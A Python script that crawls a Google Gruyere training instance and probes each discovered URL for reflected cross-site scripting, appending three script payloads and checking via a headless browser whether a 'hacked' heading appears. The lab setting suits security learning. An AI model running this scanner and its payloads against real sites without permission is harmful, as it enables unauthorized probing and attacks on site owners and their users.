from requests import get, post, exceptions
from bs4 import BeautifulSoup as bs
from playwright.sync_api import sync_playwright



INSTANCE_ID="472666335020487989751201647380414278590"
BASE_URL="https://google-gruyere.appspot.com"

INITIAL_URL=f"/{INSTANCE_ID}/"



crawl_links = set()
all_links = set()
xss_links = set()


XSS_TEST = {
    "?<script>document.write('<h1>hacked</h1>')</script>",
    "&<script>document.write('<h1>hacked</h1>')</script>",
    "<script>document.write('<h1>hacked</h1>')</script>"
  }



def crawl_url(url = INITIAL_URL):

  # print(f"Getting urls from {url}")

  url = f"{BASE_URL}{url}"

  filtered = []
  try:
    soup = bs(get(url).content, "html.parser")
    links = soup.find_all("a")
    filtered = [link.get("href", "") for link in links if INSTANCE_ID in link.get("href", "")]

  except exceptions.RequestException as e:
    print(f"Error getting content from {url}: {e}")
    return []
  
  for item in filtered:
    if item not in all_links:
      crawl_links.add(item)

  all_links.update(filtered)

  return crawl_links



def test_xss(url, page):
  for test in XSS_TEST:
    u = f"{BASE_URL}{url}{test}"
    # https://playwright.dev/python/docs/api/class-playwright
    page.goto(u)
    content = page.content()
    page.screenshot(path="screenshot.png")
    soup = bs(content, "html.parser")
    headings = soup.find_all("h1")
    if len(headings) > 0 and "hacked" in headings[0]:
      xss_links.add(url)

    



def test_urls():
  playwright = sync_playwright().start()
  chromium = playwright.chromium
  browser = chromium.launch()
  page = browser.new_page()
  for url in all_links:
    test_xss(url, page)
  browser.close()
  for link in xss_links:
    print(f"[XSS] {BASE_URL}{link}")



def crawl():
  crawl_url()
  while len(crawl_links):
    crawl_url(crawl_links.pop())

  print("")
  for item in all_links:
    print(item)
  print("")



crawl()
test_urls()

print("\nDONE")
